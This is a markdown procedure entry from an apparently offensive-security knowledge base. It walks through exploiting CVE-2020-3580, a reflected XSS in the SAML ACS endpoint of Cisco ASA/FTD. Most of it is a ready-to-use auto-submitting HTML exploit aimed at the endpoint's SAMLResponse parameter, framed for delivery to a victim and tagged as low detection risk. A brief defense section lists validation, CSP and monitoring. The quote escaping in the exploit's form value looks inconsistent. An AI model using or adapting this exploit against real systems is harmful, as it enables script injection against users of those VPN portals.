---
id: proc-uuid-1
tags:
  - xss
  - payload-crafting
  - html-injection
  - saml
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.446Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-HTML-for-XSS-Payload

## Summary

This procedure creates a malicious HTML file that embeds an XSS payload in a form submission to exploit the SAMLResponse parameter in Cisco ASA/FTD's ACS endpoint, enabling breakout from HTML attributes for JavaScript injection.

## Description

In the context of CVE-2020-3580, the SAML ACS endpoint fails to properly validate and escape the SAMLResponse POST parameter, allowing attackers to inject HTML and JavaScript. This procedure focuses on crafting an HTML file with an auto-submitting form that delivers the payload '""><svg/onload=alert('XSS')>", which closes quotes, injects an SVG element, and triggers JavaScript execution upon reflection. Prerequisites include knowledge of the target URL and access to a text editor. Expected outcomes include a functional exploit file that, when loaded, sends the malicious request.

## Requirements

1. Text editor (e.g., Notepad, VS Code) for HTML creation
2. Knowledge of the target SAML ACS URL: https://[target]/+CSCOE+/saml/sp/acs?tgname=a
3. Basic understanding of HTML forms and JavaScript payloads

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding for SAMLResponse parameter
- Use Content Security Policy (CSP) to restrict script execution on the ACS endpoint
- Monitor for anomalous POST requests to SAML endpoints with unexpected payloads

## Objectives

1. Generate a valid XSS payload that escapes HTML context
2. Embed the payload in an auto-submitting HTML form
3. Prepare the file for browser-based delivery to the victim

## Instructions

### Step 1: Create the HTML Structure

**Context**: Build the base HTML with a form targeting the vulnerable endpoint and a hidden input for the SAMLResponse.

Create `xss.html` with the following content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploit</title>
</head>
<body>
    <form id="xssForm" action="https://[target]/+CSCOE+/saml/sp/acs?tgname=a" method="POST">
        <input type="hidden" name="SAMLResponse" value="\"&gt;&lt;svg&#47;onload&#61;alert&#40;'XSS'&#41;&gt;" />
    </form>
    <script>
        document.getElementById('xssForm').submit();
    </script>
</body>
</html>
```

> This sets up the form to POST the payload automatically on load. Replace [target] with the actual hostname.

### Step 2: Validate the Payload

**Context**: Ensure the payload breaks out correctly by testing the HTML syntax.

Save and open `xss.html` in a local browser (without submitting to target) to verify auto-submit behavior without errors.

> Expected output: Form attempts to submit; no JavaScript errors in console.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-crafting]]
- [[html-injection]]
- [[saml]]
